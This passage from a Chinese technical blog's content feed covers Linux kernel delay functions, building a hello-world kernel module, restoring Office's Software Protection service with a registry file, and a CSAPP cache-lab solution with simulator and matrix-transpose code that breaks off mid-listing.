    <content><![CDATA[<p><code>msleep</code>和<code>mdelay</code>都是内核的延时函数，原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mdelay</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> msecs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">msleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> millisecs)</span>;</span><br></pre></td></tr></table></figure>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p><code>mdelay</code>是忙等待函数，会占用<code>CPU</code>资源，延迟时间是准确的。</p>
<p><code>msleep</code>是休眠函数，不占用<code>CPU</code>资源，延迟时间通常高于给定值。</p>
<span id="more"></span>

<p><strong>具体可以参考如下文章：</strong></p>
<p><a href="https://topic.alibabacloud.com/a/the-difference-between-mdelay--and-msleep--in-linux-linux_1_16_20266988.html">The difference between Mdelay and Msleep in Linux</a></p>
<p><a href="https://www.cnblogs.com/xihong2014/p/6740876.html">Linux中内核延时函数</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核模块编译方法</title>
    <url>/2020/08/15/2020-08-15-how-to-compile-kernel-module/</url>
    <content><![CDATA[<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><p><code>Linux debian 4.19.0-10-amd64</code></p>
<h3 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h3><h4 id="0-准备编译所需的内核头文件"><a href="#0-准备编译所需的内核头文件" class="headerlink" title="0. 准备编译所需的内核头文件"></a>0. 准备编译所需的内核头文件</h4><p>系统默认内核头文件路径在&#x2F;lib&#x2F;modules&#x2F;`uname -r`，先确认该路径是否存在：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /lib/modules/`uname -r`/build</span><br></pre></td></tr></table></figure>

<p>如路径不存在，需要先安装内核头文件，方法如下：</p>
<span id="more"></span>

<ul>
<li><p>获取内核版本，使用<code>uname -r</code>查看，这里为<code>4.19.0-10-amd64</code></p>
</li>
<li><p><code>apt search 4.19.0-10-amd64</code>查找安装包名称，这里为<code>linux-headers-4.19.0-10-amd64</code></p>
</li>
<li><p>安装内核头文件，执行<code>apt-get install linux-headers-4.19.0-10-amd64</code>，安装路径为<code>/usr/src/linux-headers-4.19.0-10-amd64</code></p>
</li>
</ul>
<h4 id="1-编写hello-c"><a href="#1-编写hello-c" class="headerlink" title="1. 编写hello.c"></a>1. 编写<code>hello.c</code></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>           <span class="comment">// 编译内核模块必须加载的头文件module.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);    <span class="comment">// 模块加载</span></span><br><span class="line">module_exit(hello_exit);    <span class="comment">// 模块卸载</span></span><br></pre></td></tr></table></figure>

<p>模块加载时打印<code>hello_init</code>, 模块卸载时打印<code>hello_exit</code>。</p>
<h4 id="2-编写Makefile"><a href="#2-编写Makefile" class="headerlink" title="2.编写Makefile"></a>2.编写Makefile</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m += hello.o    						<span class="comment"># -m编译内核模块</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">PWD=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">KDIR=/usr/src/linux-headers-4.19.0-10-amd64 <span class="comment"># 指定内核头文件路径</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules     <span class="comment"># -C指定内核头文件路径, M指定源码路径</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p><code>PWD</code>指定源码路径，即<code>hello.c</code>的路径。</p>
<p><code>KDIR</code>指定内核源码路径。</p>
<p><code>KERNELRELEASE</code>是在内核源码的顶层Makefile里定义的变量，用法可参考<a href="https://blog.csdn.net/cjluxuwei/article/details/37878021">这篇文章</a></p>
<h4 id="3-加载模块"><a href="#3-加载模块" class="headerlink" title="3.加载模块"></a>3.加载模块</h4><p>加载ko：<code>insmod hello.ko</code></p>
<p>卸载ko：<code>rmmod hello.ko</code></p>
<p>查看ko是否加载：<code>lsmod | grep hello.ko</code></p>
<p>打印信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dmesg -c</span><br><span class="line">[  821.764791] hello_init</span><br><span class="line">[  897.219392] hello_exit</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Office无法找到应用程序许可证</title>
    <url>/2020/08/15/2020-08-15-office-cannot-find-license/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>打开<code>office</code>软件失败，提示无法找到应用程序的许可证。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><code>Software Protection</code>服务启动失败，可以通过<code>services.msc</code>查看该服务的启动状态</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>修改注册表，将如下文本复制到文件，文件名改为<code>software prtection服务.reg</code>, 双击该文件即可。</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc]</span><br><span class="line">&quot;StartProtected&quot;=dword:00000001</span><br><span class="line">&quot;DisplayName&quot;=&quot;@%SystemRoot%\\system32\\sppsvc.exe,-101&quot;</span><br><span class="line">&quot;ErrorControl&quot;=dword:00000001</span><br><span class="line">&quot;ImagePath&quot;=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\</span><br><span class="line">  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,73,\</span><br><span class="line">  00,70,00,70,00,73,00,76,00,63,00,2e,00,65,00,78,00,65,00,00,00</span><br><span class="line">&quot;Start&quot;=dword:00000002</span><br><span class="line">&quot;Type&quot;=dword:00000010</span><br><span class="line">&quot;Description&quot;=&quot;@%SystemRoot%\\system32\\sppsvc.exe,-100&quot;</span><br><span class="line">&quot;DependOnService&quot;=hex(7):52,00,70,00,63,00,53,00,73,00,00,00,00,00</span><br><span class="line">&quot;ObjectName&quot;=&quot;NT AUTHORITY\\NetworkService&quot;</span><br><span class="line">&quot;ServiceSidType&quot;=dword:00000001</span><br><span class="line">&quot;RequiredPrivileges&quot;=hex(7):53,00,65,00,41,00,75,00,64,00,69,00,74,00,50,00,72,\</span><br><span class="line">  00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,68,00,\</span><br><span class="line">  61,00,6e,00,67,00,65,00,4e,00,6f,00,74,00,69,00,66,00,79,00,50,00,72,00,69,\</span><br><span class="line">  00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,72,00,65,00,\</span><br><span class="line">  61,00,74,00,65,00,47,00,6c,00,6f,00,62,00,61,00,6c,00,50,00,72,00,69,00,76,\</span><br><span class="line">  00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,49,00,6d,00,70,00,65,00,\</span><br><span class="line">  72,00,73,00,6f,00,6e,00,61,00,74,00,65,00,50,00,72,00,69,00,76,00,69,00,6c,\</span><br><span class="line">  00,65,00,67,00,65,00,00,00,00,00</span><br><span class="line">&quot;DelayedAutoStart&quot;=dword:00000001</span><br><span class="line">&quot;FailureActions&quot;=hex:80,51,01,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\</span><br><span class="line">  00,01,00,00,00,c0,d4,01,00,01,00,00,00,e0,93,04,00,00,00,00,00,00,00,00,00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\Security]</span><br><span class="line">&quot;Security&quot;=hex:01,00,14,80,a0,00,00,00,ac,00,00,00,14,00,00,00,30,00,00,00,02,\</span><br><span class="line">  00,1c,00,01,00,00,00,02,80,14,00,ff,01,0f,00,01,01,00,00,00,00,00,01,00,00,\</span><br><span class="line">  00,00,02,00,70,00,05,00,00,00,00,00,14,00,ff,01,02,00,01,01,00,00,00,00,00,\</span><br><span class="line">  05,12,00,00,00,00,00,18,00,fd,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,\</span><br><span class="line">  20,02,00,00,00,00,14,00,9d,01,02,00,01,01,00,00,00,00,00,05,04,00,00,00,00,\</span><br><span class="line">  00,14,00,9d,01,02,00,01,01,00,00,00,00,00,05,06,00,00,00,00,00,14,00,14,00,\</span><br><span class="line">  00,00,01,01,00,00,00,00,00,05,0b,00,00,00,01,01,00,00,00,00,00,05,12,00,00,\</span><br><span class="line">  00,01,01,00,00,00,00,00,05,12,00,00,00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\TriggerInfo]</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\TriggerInfo\0]</span><br><span class="line">&quot;Type&quot;=dword:00000014</span><br><span class="line">&quot;Action&quot;=dword:00000001</span><br><span class="line">&quot;GUID&quot;=hex:da,8a,52,f5,5f,be,14,4f,8a,ef,a9,5d,e7,28,11,61</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/jenyzhang/article/details/51867485">https://blog.csdn.net/jenyzhang/article/details/51867485</a></p>
]]></content>
      <categories>
        <category>Win</category>
      </categories>
      <tags>
        <tag>Win</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 缓存实验</title>
    <url>/2020/08/16/2020-08-16-csapp-cachelab/</url>
    <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>编写一个通用高速缓存模拟器，并优化小型矩阵转置核心函数，以最小化对模拟高速缓存的不命中次数。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="1-局部性原理"><a href="#1-局部性原理" class="headerlink" title="1. 局部性原理"></a>1. 局部性原理</h4><p>局部性通常有两种形式：</p>
<ul>
<li>时间局部性：被引用过一次的内存位置很可能在不远的将来被多次引用。</li>
<li>空间局部性：如一个内存位置被引用，其附近的内存位置很可能在不远的将来被引用。</li>
</ul>
<span id="more"></span>

<h4 id="2-存储器层次结构"><a href="#2-存储器层次结构" class="headerlink" title="2. 存储器层次结构"></a>2. 存储器层次结构</h4><p>下图展示了一个典型的存储器层次结构：<br><img src="/2020/08/16/2020-08-16-csapp-cachelab/image1.png"></p>
<p>可以看出，从高往低走，存储设备变得更慢，更大，更便宜。</p>
<h4 id="3-缓存"><a href="#3-缓存" class="headerlink" title="3. 缓存"></a>3. 缓存</h4><p>缓存被组织成一个有S组，每组E行，每行由一个B字节数据块、一个有效位、一个标记位组成。结构如下：<br><img src="/2020/08/16/2020-08-16-csapp-cachelab/image2.png"></p>
<p>一个m位地址被划分为标记、组索引、块偏移三个部分。</p>
<p>缓存确定一个请求是否命中，然后抽取被请求字的过程分为三步：</p>
<ul>
<li>组选择：从地址中间抽取s位组索引，得到组号i。比如s&#x3D;4, 组索引为0010时，组号i &#x3D; 2。</li>
<li>行匹配：从地址抽取t位标记，与组i中每个行的标记进行比较，如标记相等且有效位为1则命中。</li>
<li>字抽取：根据地址的b位块偏移, 直接从行中得到数据。</li>
</ul>
<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>从<a href="http://csapp.cs.cmu.edu/3e/labs.html">CSAPP官网</a>获取实验文件。</p>
<p>阅读<a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">cachelab.pdf</a>，了解实验内容。</p>
<h3 id="实验一：-实现缓存模拟器"><a href="#实验一：-实现缓存模拟器" class="headerlink" title="实验一： 实现缓存模拟器"></a>实验一： 实现缓存模拟器</h3><p>修改<code>csim.c</code>， 实现<code>LRU</code>策略的缓存模拟器，最终目标是与<code>csim-ref</code>执行结果一致。</p>
<p><strong>实现要点：</strong></p>
<ul>
<li><p>使用<code>getopt</code>解析命令行参数，<code>man 3 getopt</code>查看用法。</p>
</li>
<li><p>解析<code>traces</code>文件，可以使用<code>fgets</code>和<code>sscanf</code>实现。</p>
</li>
<li><p>缓存结构本质是一个二维数组 <code>cache[S][E]</code>，但由于<code>s</code>, <code>E</code>, <code>b</code>不确定, 需要使用<code>malloc</code>分配。</p>
</li>
<li><p>缓存替换策略采用<code>LRU</code>，可通过每行设计一个时间戳，每更新一次缓存将时间戳加1。</p>
</li>
</ul>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令行参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    <span class="type">int</span> E;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">char</span> traceFile[BUFFER_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// getopt解析命令行输入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parseArgs</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="string">&#x27;h&#x27;</span>) &#123;</span><br><span class="line">            printHelp();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;s = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;E = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;b&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;b = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(args-&gt;traceFile, optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化Cache结构</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="keyword">struct</span> Args *args)</span> &#123;</span><br><span class="line">    cache-&gt;s = args-&gt;s;</span><br><span class="line">    cache-&gt;S = <span class="number">1</span> &lt;&lt; cache-&gt;s;</span><br><span class="line">    cache-&gt;E = args-&gt;E;</span><br><span class="line">    cache-&gt;b = args-&gt;b;</span><br><span class="line">    cache-&gt;sets = (<span class="keyword">struct</span> CacheSet *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> CacheSet) * cache-&gt;S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; ++i) &#123;</span><br><span class="line">        cache-&gt;sets[i].lines = (<span class="keyword">struct</span> CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> CacheLine) * cache-&gt;E);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cache-&gt;E; ++j) &#123;</span><br><span class="line">            cache-&gt;sets[i].lines[j].valid = INVALID;</span><br><span class="line">            cache-&gt;sets[i].lines[j].tag = INVALID_TAG;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放Cache</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">recycleCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; ++i) &#123;</span><br><span class="line">        <span class="built_in">free</span>(cache-&gt;sets[i].lines);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateTimeStamp</span><span class="params">(<span class="keyword">struct</span> Cache *cache)</span> &#123;</span><br><span class="line">    <span class="type">int</span> numSets = cache-&gt;S;</span><br><span class="line">    <span class="type">int</span> numLines = cache-&gt;E;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numSets; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; numLines; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cache-&gt;sets[i].lines[j].valid == VALID) &#123;</span><br><span class="line">                ++cache-&gt;sets[i].lines[j].timestamp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">int64_t</span> addr, <span class="keyword">struct</span> Result *result)</span> &#123;</span><br><span class="line">    <span class="type">int</span> numLines = cache-&gt;E;</span><br><span class="line">    <span class="comment">// 标记 + 组索引(s位) + 块偏移(b位)</span></span><br><span class="line">    <span class="type">int</span> setIndex = (addr &gt;&gt; cache-&gt;b) &amp; (cache-&gt;S - <span class="number">1</span>); <span class="comment">// 先求s位组索引, 得到addr位于第几组</span></span><br><span class="line">    <span class="type">int</span> tag = addr &gt;&gt; (cache-&gt;s + cache-&gt;b);            <span class="comment">// 求出tag, 方法为地址右移s+b位</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheSet</span> *<span class="title">curSet</span> =</span> &amp;cache-&gt;sets[setIndex];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].tag == tag) &#123;  <span class="comment">// tag相等表示命中</span></span><br><span class="line">            ++result-&gt;hits;</span><br><span class="line">            curSet-&gt;lines[i].timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不命中</span></span><br><span class="line">    ++result-&gt;misses;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].valid == INVALID) &#123; <span class="comment">// 找到一个空行</span></span><br><span class="line">            curSet-&gt;lines[i].tag = tag;</span><br><span class="line">            curSet-&gt;lines[i].valid = VALID;</span><br><span class="line">            curSet-&gt;lines[i].timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有命中又没有空行, 表示冲突不命中</span></span><br><span class="line">    ++result-&gt;evictions;</span><br><span class="line">    <span class="type">int</span> maxIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxTime = curSet-&gt;lines[<span class="number">0</span>].timestamp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].timestamp &gt; maxTime) &#123;</span><br><span class="line">            maxTime = curSet-&gt;lines[i].timestamp;</span><br><span class="line">            maxIdx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    curSet-&gt;lines[maxIdx].tag = tag;</span><br><span class="line">    curSet-&gt;lines[maxIdx].timestamp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">char</span> ch, <span class="type">int64_t</span> addr, <span class="keyword">struct</span> Result *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    update(cache, addr, result);</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27;M&#x27;</span>) &#123;                 <span class="comment">// 一次读取加上一次写入, 相当于update两次</span></span><br><span class="line">        update(cache, addr, result);</span><br><span class="line">    &#125;</span><br><span class="line">    updateTimeStamp(cache);         <span class="comment">// 每条指令执行后更新timestamp</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DoParse</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">char</span> *traceFile, <span class="keyword">struct</span> Result *result)</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int64_t</span> addr;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    fp = fopen(traceFile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open traceFile: %s failed!\n&quot;</span>, traceFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// fgets + sscanf解析trace文件</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, BUFFER_SIZE, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>) &#123; <span class="comment">// &#x27;I&#x27;表示指令cache，不做处理</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot; %c %lx,%d\n&quot;</span>, &amp;ch, &amp;addr, &amp;size);</span><br><span class="line">        updateCache(cache, ch, addr, result);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Args</span> <span class="title">args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Cache</span> <span class="title">cache</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Result</span> <span class="title">res</span> =</span> &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    parseArgs(argc, argv, &amp;args);</span><br><span class="line">    initCache(&amp;cache, &amp;args);</span><br><span class="line">    DoParse(&amp;cache, args.traceFile, &amp;res);</span><br><span class="line">    recycleCache(&amp;cache);</span><br><span class="line">    printSummary(res.hits, res.misses, res.evictions);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实验二：-优化矩阵转置"><a href="#实验二：-优化矩阵转置" class="headerlink" title="实验二： 优化矩阵转置"></a>实验二： 优化矩阵转置</h3><p>实验二要求在<code>trans.c</code>中实现矩阵转置函数，最小化缓存不命中的次数。</p>
<p>实验二中的缓存结构为 <code>S = 5, E = 1, b = 5</code>，即32组，每组1行，每行32字节，每行可放8个<code>int</code>数</p>
<p>利用分块技术和局部变量减少miss，分块技术可参考 <a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">waside-blocking.pdf</a></p>
<h4 id="32-32"><a href="#32-32" class="headerlink" title="32 * 32"></a>32 * 32</h4><p>由于缓存的每一行能放8个数，考虑将32 * 32划分为16个8 * 8 的分块，每次处理单个8 * 8的分块，再利用局部变量减少miss。代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; M; i += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; j += <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = i; k &lt; i + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                    a1 = A[k][j];</span><br><span class="line">                    a2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                    a3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                    a4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                    a5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                    a6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                    a7 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                    a8 = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[j][k] = a1;</span><br><span class="line">                    B[j+<span class="number">1</span>][k] = a2;</span><br><span class="line">                    B[j+<span class="number">2</span>][k] = a3;</span><br><span class="line">                    B[j+<span class="number">3</span>][k] = a4;</span><br><span class="line">                    B[j+<span class="number">4</span>][k] = a5;</span><br><span class="line">                    B[j+<span class="number">5</span>][k] = a6;</span><br><span class="line">                    B[j+<span class="number">6</span>][k] = a7;</span><br><span class="line">                    B[j+<span class="number">7</span>][k] = a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果改用4 * 4分块，会导致缓存利用不足，因为缓存的一行可以放8个数；也不能用16 * 16分块，会导致块内冲突。</p>
<p>使用8个局部变量(<code>a1 ~ a8</code>）的目的是避免写入B时，在对角线发生冲突不命中。因为A和B中相同位置的元素会映射到同一行。而矩阵转置不会改变对角线上的元素位置，导致多出现两次不命中。</p>
<h4 id="61-67"><a href="#61-67" class="headerlink" title="61 * 67"></a>61 * 67</h4><p>和32*32类似，尝试分块法，发现8 * 8即可满足要求，再利用局部变量减少<code>miss</code>。</p>
<p>首先对56 * 64部分进行8 * 8分块，其余部分直接简单转置即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, j, a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">56</span>; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                a2 = A[i][j+<span class="number">1</span>];</span><br><span class="line">                a3 = A[i][j+<span class="number">2</span>];</span><br><span class="line">                a4 = A[i][j+<span class="number">3</span>];</span><br><span class="line">                a5 = A[i][j+<span class="number">4</span>];</span><br><span class="line">                a6 = 